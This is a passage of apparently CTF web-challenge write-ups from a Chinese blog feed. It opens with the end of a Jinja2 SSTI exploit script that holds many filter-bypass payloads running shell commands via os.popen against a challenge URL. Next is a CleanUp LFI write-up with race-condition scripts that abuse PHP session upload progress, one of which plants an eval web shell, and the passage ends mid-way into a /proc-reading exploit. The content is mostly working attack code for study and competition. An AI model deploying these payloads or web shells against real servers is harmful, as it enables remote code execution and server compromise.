class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(l):<br>        <span class="hljs-comment"># 带wrapper的并不是function,没有global属性</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;wrapper&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[i].__init__):<br>            <span class="hljs-built_in">print</span>(i, <span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[i])<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">string_concat</span>(<span class="hljs-params">tar:<span class="hljs-built_in">str</span></span>):</span><br>    config  = <span class="hljs-string">&quot;&lt;Config &#123;&#x27;ENV&#x27;: &#x27;production&#x27;, &#x27;DEBUG&#x27;: False, &#x27;TESTING&#x27;: False, &#x27;PROPAGATE_EXCEPTIONS&#x27;: None, &#x27;PRESERVE_CONTEXT_ON_EXCEPTION&#x27;: None, &#x27;SECRET_KEY&#x27;: None, &#x27;PERMANENT_SESSION_LIFETIME&#x27;: datetime.timedelta(days=31), &#x27;USE_X_SENDFILE&#x27;: False, &#x27;SERVER_NAME&#x27;: None, &#x27;APPLICATION_ROOT&#x27;: &#x27;/&#x27;, &#x27;SESSION_COOKIE_NAME&#x27;: &#x27;session&#x27;, &#x27;SESSION_COOKIE_DOMAIN&#x27;: None, &#x27;SESSION_COOKIE_PATH&#x27;: None, &#x27;SESSION_COOKIE_HTTPONLY&#x27;: True, &#x27;SESSION_COOKIE_SECURE&#x27;: False, &#x27;SESSION_COOKIE_SAMESITE&#x27;: None, &#x27;SESSION_REFRESH_EACH_REQUEST&#x27;: True, &#x27;MAX_CONTENT_LENGTH&#x27;: None, &#x27;SEND_FILE_MAX_AGE_DEFAULT&#x27;: datetime.timedelta(seconds=43200), &#x27;TRAP_BAD_REQUEST_ERRORS&#x27;: None, &#x27;TRAP_HTTP_EXCEPTIONS&#x27;: False, &#x27;EXPLAIN_TEMPLATE_LOADING&#x27;: False, &#x27;PREFERRED_URL_SCHEME&#x27;: &#x27;http&#x27;, &#x27;JSON_AS_ASCII&#x27;: True, &#x27;JSON_SORT_KEYS&#x27;: True, &#x27;JSONIFY_PRETTYPRINT_REGULAR&#x27;: False, &#x27;JSONIFY_MIMETYPE&#x27;: &#x27;application/json&#x27;, &#x27;TEMPLATES_AUTO_RELOAD&#x27;: None, &#x27;MAX_COOKIE_SIZE&#x27;: 4093&#125;&quot;</span><br>    select = <span class="hljs-string">&quot;&lt;generator object select_or_reject at 0x7f3b57e0c740&gt;&quot;</span><br><br>    res = []<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tar:<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> select:<br>                res.append(<span class="hljs-string">&quot;(()|select|string|list).pop(&quot;</span> + <span class="hljs-string">&#x27;+&#x27;</span>.join(select.index(i) * [<span class="hljs-string">&quot;True&quot;</span>]) + <span class="hljs-string">&quot;)&quot;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                res.append(<span class="hljs-string">&quot;(config|string|list).pop(&quot;</span> + <span class="hljs-string">&#x27;+&#x27;</span>.join(config.index(i) * [<span class="hljs-string">&quot;True&quot;</span>]) + <span class="hljs-string">&quot;)&quot;</span>)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;sorry for that:&#x27;</span>, i)<br>            <span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;sys&#x27;</span>).exit(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> (<span class="hljs-string">&#x27;+&#x27;</span>.join(res))<br><br><br>payload = &#123;&#125;<br>payload[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;&#123;&#123;().__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat /flag&#x27;).read()&#125;&#125;&quot;</span><br>payload[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;&#123;&#123;().__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(\&#x27;os\&#x27;).popen(\&#x27;ls\&#x27;).read()&#x27;)&#125;&#125;&quot;</span><br>payload[<span class="hljs-number">2</span>] = <span class="hljs-string">&quot;&#123;&#123;cycler.__init__.__globals__[&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;whoami&#x27;).read()&#125;&#125;&quot;</span><br><br><span class="hljs-comment"># 运算绕过</span><br>payload[<span class="hljs-number">3</span>] = <span class="hljs-string">&quot;&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[17*8-4].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat /flag&#x27;).read()&#125;&#125;&quot;</span><br><br><span class="hljs-comment"># 单引号绕过&amp;参数绕过</span><br>payload[<span class="hljs-number">4</span>] = <span class="hljs-string">&quot;&#123;&#123;lipsum.__globals__.os.popen(request.args.wis).read()&#125;&#125;&amp;wis=cat /flag&quot;</span><br><br><span class="hljs-comment"># 引号绕过&amp;引入chr</span><br>payload[<span class="hljs-number">5</span>] = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&#123;% set chr=().__class__.__mro__[-1].__subclasses__()[132].__init__.__globals__.__builtins__.chr %&#125;</span><br><span class="hljs-string">&#123;% print(cycler.__init__.__globals__.os.popen(chr(99)+chr(97)+chr(116)+chr(32)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)).read()) %&#125;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>.replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># 过滤器连接字符串</span><br>payload[<span class="hljs-number">6</span>] = <span class="hljs-string">&quot;&#123;&#123;().__class__.__mro__[-1].__subclasses__()[132].__init__.__globals__.popen((config|string)[22]+(config|string)[40]+(config|string)[23]+(config|string)[7]+(config|string)[279]+(config|string)[4]+(config|string)[41]+(config|string)[40]+(config|string)[6]).read()&#125;&#125;&quot;</span><br><br><span class="hljs-comment"># __getitem__ 和 pop 绕过[]，其实也能绕过.</span><br>payload[<span class="hljs-number">7</span>]=<span class="hljs-string">&#x27;&#x27;&#x27;&#123;&#123;().__class__.__base__.__subclasses__().pop(132).__init__.__globals__.popen(</span><br><span class="hljs-string">(config|string).__getitem__(22)+(config|string).__getitem__(40)+(config|string).__getitem__(23)+(config|string).__getitem__(7)+(config|string).__getitem__(279)+(config|string).__getitem__(4)+(config|string).__getitem__(41)+(config|string).__getitem__(40)+(config|string).__getitem__(6)</span><br><span class="hljs-string">).read()&#125;&#125;&#x27;&#x27;&#x27;</span>.replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># request.values</span><br>payload[<span class="hljs-number">8</span>] = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&#123;&#123;lipsum.__globals__.os.popen(request.cookies.wis).read()&#125;&#125;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>.replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-comment">#wis=cat /flag</span><br><br><span class="hljs-comment"># 过滤OS关键字</span><br>payload[<span class="hljs-number">9</span>] = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&#123;&#123;(lipsum|attr(request.cookies.a)).get(request.cookies.c).popen(request.cookies.b).read()&#125;&#125;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>.replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># 过滤&#123;&#123;</span><br>payload[<span class="hljs-number">10</span>] = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&#123;% print((lipsum|attr(request.cookies.a)).get(request.cookies.c).popen(request.cookies.b).read()) %&#125;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>.replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># 过滤request，True转变为数字</span><br>payload[<span class="hljs-number">11</span>] = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&#123;% print((lipsum|attr((()|select|string|list).pop(24)+(()|select|string|list).pop(24)+(()|select|string|list).pop(1)+(()|select|string|list).pop(20)+(()|select|string|list).pop(8)+(()|select|string|list).pop(12)+(()|select|string|list).pop(6)+(()|select|string|list).pop(20)+(()|select|string|list).pop(18)+(()|select|string|list).pop(24)+(()|select|string|list).pop(24)))</span><br><span class="hljs-string">.get((()|select|string|list).pop(8)+(()|select|string|list).pop(18))</span><br><span class="hljs-string">.popen((()|select|string|list).pop(15)+(()|select|string|list).pop(6)+(()|select|string|list).pop(7)+(()|select|string|list).pop(10)+(config|string|list).pop(279)+(()|select|string|list).pop(41)+(()|select|string|list).pop(20)+(()|select|string|list).pop(6)+(()|select|string|list).pop(1)).read()) %&#125;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>.replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># 过滤数字</span><br>payload[<span class="hljs-number">12</span>] = <span class="hljs-string">&quot;&#123;% print( (lipsum|attr(&quot;</span>+ string_concat(<span class="hljs-string">&quot;__globals__&quot;</span>)+<span class="hljs-string">&quot;)).get(&quot;</span>+string_concat(<span class="hljs-string">&#x27;os&#x27;</span>)+<span class="hljs-string">&quot;).popen(&quot;</span>+string_concat(<span class="hljs-string">&quot;cat /flag&quot;</span>)+<span class="hljs-string">&quot;).read() )%&#125;&quot;</span><br><br><br><span class="hljs-comment"># 过滤print</span><br><span class="hljs-comment"># 反弹shell或者输出到静态文件中</span><br>payload[<span class="hljs-number">13</span>] = <span class="hljs-string">&quot;&#123;% if((lipsum|attr(&quot;</span>+ string_concat(<span class="hljs-string">&quot;__globals__&quot;</span>)+<span class="hljs-string">&quot;)).get(&quot;</span>+string_concat(<span class="hljs-string">&#x27;os&#x27;</span>)+<span class="hljs-string">&quot;).popen(&quot;</span>+string_concat(<span class="hljs-string">&quot;cat /flag &gt; /app/&quot;</span>)+<span class="hljs-string">&quot;).read()) )%&#125;hello&#123;% endif %&#125;&quot;</span><br><br><span class="hljs-comment"># 16进制编码（过滤. [）</span><br> <span class="hljs-string">&#x27;&#123;&#123;((lipsum|attr(&quot;\\x5f\\x5fglo&quot;&quot;bals\\x5f\\x5f&quot;)|attr(&quot;get&quot;)(&quot;\\x5f\\x5fbuiltins\\x5f\\x5f&quot;))|attr(&quot;get&quot;)(&quot;eval&quot;))(&quot;\\x5f\\x5fimport\\x5f\\x5f(\\x22os\\x22)\\x2epopen(\\x22whoami\\x22)\\x2eread()&quot;)&#125;&#125;&#x27;</span><br><br>url = <span class="hljs-string">&quot;http://482f9784-8144-40e1-afbd-32ab9244bc34.challenge.ctf.show/&quot;</span><br><br>real_waf = waf_test()<br><br>real_payload = payload[<span class="hljs-number">13</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> real_waf:<br>    <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> real_payload:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;!!! detect : &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(i))<br><br>r = requests.get(url = url,<br>                 params=&#123;<br>                     <span class="hljs-string">&quot;name&quot;</span>: real_payload,<br>                 &#125;,<br>                 )<br>html_text = r.text.replace(<span class="hljs-string">&#x27;&amp;lt;&#x27;</span>,<span class="hljs-string">&quot;&lt;&quot;</span>).replace(<span class="hljs-string">&quot;&amp;#39;&quot;</span>, <span class="hljs-string">&#x27;\&#x27;&#x27;</span>).replace(<span class="hljs-string">&quot;&amp;#34;&quot;</span>,<span class="hljs-string">&quot;\&quot;&quot;</span>).replace(<span class="hljs-string">&#x27;&amp;gt;&#x27;</span>,<span class="hljs-string">&#x27;&gt;&#x27;</span>)<br><span class="hljs-built_in">print</span>(html_text)<br><br><span class="hljs-comment"># res = html_text.split(&quot;&lt;h3&gt;&quot;)[1].split(&quot;&lt;/h3&gt;&quot;)[0].split(&#x27;,&#x27;)</span><br><span class="hljs-comment"># for i in res:</span><br><span class="hljs-comment">#     if &#x27;chr&#x27; in i:</span><br><span class="hljs-comment">#         print(i, res.index(i))</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Web漏洞</category>
      
      <category>SSTI</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
      <tag>wp</tag>
      
      <tag>SSTI</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF-Web-wp</title>
    <link href="/2022/04/13/blog0013-NSS-Web-wp/"/>
    <url>/2022/04/13/blog0013-NSS-Web-wp/</url>
    
    <content type="html"><![CDATA[<p>记录一下在各种平台做到一些题目</p><span id="more"></span><h2 id="lfi">1、LFI</h2><h3 id="第五空间-cleanup条件竞争">1、2021第五空间-CleanUp（条件竞争）</h3><p>直接放上源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;mode&#x27;</span>]))&#123; <br>        highlight_file(<span class="hljs-keyword">__file__</span>); <br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;mode&#x27;</span>] == <span class="hljs-string">&quot;eval&quot;</span>)&#123; <br>        <span class="hljs-variable">$shell</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shell&#x27;</span>] : <span class="hljs-string">&#x27;phpinfo();&#x27;</span>; <br>        <span class="hljs-keyword">if</span>(strlen(<span class="hljs-variable">$shell</span>) &gt; <span class="hljs-number">15</span>)&#123;<br>            <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;hacker&quot;</span>); <br>        &#125;<br>        <span class="hljs-keyword">if</span>(filter(<span class="hljs-variable">$shell</span>))&#123;<br>            <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;filter&quot;</span>); <br>        &#125;<br>        <span class="hljs-keyword">if</span>(checkNums(<span class="hljs-variable">$shell</span>))&#123;<br>            <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;shell&quot;</span>); <br>        &#125;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$shell</span>); <br>    &#125; <br><br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123; <br>        <span class="hljs-keyword">if</span>(strlen(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]) &gt; <span class="hljs-number">15</span> | filter(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;hacker&quot;</span>); <br>        <span class="hljs-keyword">include</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]; <br>    &#125; <br><br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span>&#123; <br>        <span class="hljs-variable">$banned</span> = [<span class="hljs-string">&quot;while&quot;</span>, <span class="hljs-string">&quot;for&quot;</span>, <span class="hljs-string">&quot;\$_&quot;</span>, <span class="hljs-string">&quot;include&quot;</span>, <span class="hljs-string">&quot;env&quot;</span>, <span class="hljs-string">&quot;require&quot;</span>, <span class="hljs-string">&quot;?&quot;</span>, <span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;^&quot;</span>, <span class="hljs-string">&quot;+&quot;</span>, <span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;`&quot;</span>]; <br><br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$banned</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$ban</span>)&#123; <br>            <span class="hljs-keyword">if</span>(strstr(<span class="hljs-variable">$var</span>, <span class="hljs-variable">$ban</span>)) <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>; <br>        &#125; <br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>; <br>    &#125; <br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkNums</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span>&#123; <br>        <span class="hljs-variable">$alphanum</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>; <br>        <span class="hljs-variable">$cnt</span> = <span class="hljs-number">0</span>; <br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; strlen(<span class="hljs-variable">$alphanum</span>); <span class="hljs-variable">$i</span>++)&#123; <br>            <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$j</span> &lt; strlen(<span class="hljs-variable">$var</span>); <span class="hljs-variable">$j</span>++)&#123; <br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$var</span>[<span class="hljs-variable">$j</span>] == <span class="hljs-variable">$alphanum</span>[<span class="hljs-variable">$i</span>])&#123; <br>                    <span class="hljs-variable">$cnt</span> += <span class="hljs-number">1</span>; <br>                    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$cnt</span> &gt; <span class="hljs-number">8</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>; <br>                &#125; <br>            &#125; <br>        &#125; <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>; <br>    &#125; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>简单分析之后，我们可以发现首先对注入的代码长度做出了限制，还对字符做出了限制，这样我们能打的空间比较小了。</p><p>尝试一下</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">mode=eval&amp;shell=system(&#x27;ls /&#x27;);<br></code></pre></td></tr></table></figure><p>于是找到了flag在根目录下，其实看到docker环境想试试pearcmd.php能不能利用上，但是被长度限制卡死了。</p><p>接下来可以考虑试试能不能卡临时文件包含（这个其实也只能猜，因为其实没有给session，试试看）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread<br><br>sess_id = <span class="hljs-string">&quot;p&quot;</span><br>url = <span class="hljs-string">&quot;http://1.14.71.254:28475/&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">post_file</span>(<span class="hljs-params">session</span>):</span><br>    content = io.BytesIO(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">1024</span>*<span class="hljs-number">20</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        session.post(<br>            url=url,         <br>            data=&#123;<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="hljs-string">&quot;&lt;?php system(&#x27;cat /nssctfasdasdflag&#x27;);echo md5(&#x27;1&#x27;);?&gt;&quot;</span>&#125;,<br>            cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: sess_id&#125;,<br>            files=&#123;<span class="hljs-string">&quot;file&quot;</span>: (<span class="hljs-string">&#x27;a.txt&#x27;</span>, content)&#125;,<br>        )<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;上传文件----&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_content</span>(<span class="hljs-params">session</span>):</span><br>    params = &#123;<br>        <span class="hljs-string">&quot;file&quot;</span>:<span class="hljs-string">&quot;/tmp/sess_&quot;</span> + sess_id<br>    &#125;<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;res.html&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> fout:<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            r = session.get(url=url,params=params)<br>            check = <span class="hljs-string">&quot;c4ca4238a0b923820dcc509a6f75849b&quot;</span><br>            <span class="hljs-keyword">if</span> check <span class="hljs-keyword">in</span> r.text:<br>                fout.write(r.text)<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;retry---&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">with</span> requests.session() <span class="hljs-keyword">as</span> session:<br>        t1 = Thread(target=post_file, args=(session,))<br>        t2 = Thread(target=get_content,args=(session,))<br>        t1.start()<br>        t2.start()<br></code></pre></td></tr></table></figure><p>其实最开始想要将命令逃逸出去实现任意RCE，但是发现好像并没有写的权限（这里也附上脚本，说不定啥时候就能一把梭了）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread<br><br>sess_id = <span class="hljs-string">&quot;p&quot;</span><br>url = <span class="hljs-string">&quot;http://1.14.71.254:28475/&quot;</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">upload</span>(<span class="hljs-params">session</span>):</span><br>    content = io.BytesIO(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">1024</span>*<span class="hljs-number">20</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        session.post(<br>            url=url,         <br>            data=&#123;<br>                <span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="hljs-string">&quot;&lt;?php file_put_contents(&#x27;/var/www/html/1.php&#x27;,&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;);echo md5(&#x27;1&#x27;);?&gt;&quot;</span><br>            &#125;,<br>            cookies=&#123;<br>                <span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: sess_id<br>            &#125;,<br>            files=&#123;<br>                <span class="hljs-string">&quot;file&quot;</span>: (<span class="hljs-string">&#x27;a.txt&#x27;</span>, content)<br>            &#125;,<br>        )<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;上传文件----&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">LFI</span>(<span class="hljs-params">session</span>):</span><br>    params = &#123;<br>        <span class="hljs-string">&quot;file&quot;</span>:<span class="hljs-string">&quot;/tmp/sess_&quot;</span> + sess_id<br>    &#125;<br>    <span class="hljs-comment">#with open(&quot;res.html&quot;,&quot;w&quot;) as fout:</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        r = session.get(url=url,params=params)<br>        check = <span class="hljs-string">&quot;c4ca4238a0b923820dcc509a6f75849b&quot;</span><br>        <span class="hljs-keyword">if</span> check <span class="hljs-keyword">in</span> r.text:<br>            <span class="hljs-comment">#fout.write(r.text)</span><br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;LFI读取---&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">vuln</span>(<span class="hljs-params">session</span>):</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        r = session.get(url + <span class="hljs-string">&quot;1.php&quot;</span>)<br>        <span class="hljs-keyword">if</span> r.status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-comment">#print(&quot;get_vuln&quot;)</span><br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;获取vuln---&quot;</span>)      <br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">with</span> requests.session() <span class="hljs-keyword">as</span> session:<br>        t1 = Thread(target=upload, args=(session,))<br>        t2 = Thread(target=LFI,args=(session,))<br>        t3 = Thread(target=vuln,args=(session,))<br>        t1.start()<br>        t2.start()<br>        t3.start()<br></code></pre></td></tr></table></figure><h3 id="sdctf-2022curl-read-and-uplfi读取proc">2、SDCTF 2022—cURL Read and UP（LFI读取/proc）</h3><p>这道题发现漏洞点倒不是非常难，但是最开始确实是不知道flag在哪里。</p><p>进去之后输入url，http://www.baidu.com</p><p>跳转到某个页面，研究URL，发现read之后的内容似乎为base64编码，解码后发现其实就是JSON</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//43.143.7.127:28318/read/eyJ1cmwiOiJmaWxlOi8vL3Byb2MvMTgvZW52aXJvbiJ9</span><br></code></pre></td></tr></table></figure><p>于是直接构造脚本读取文件了</p><p>这里补充一下/proc的相关知识，Linux中"一切皆文件"，因此可以通过/proc目录下的内容读取进程相关的信息</p><p>首先通过读取<code>/proc/self/status</code>，读取到父进程的pid，也就是web服务进程</p><p>再通过<code>/proc/&lt;pid&gt;/environ</code>读取到当前进程的环境变量配置</p><p>只能说，还是不太熟悉flag可能隐藏的地方。</p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 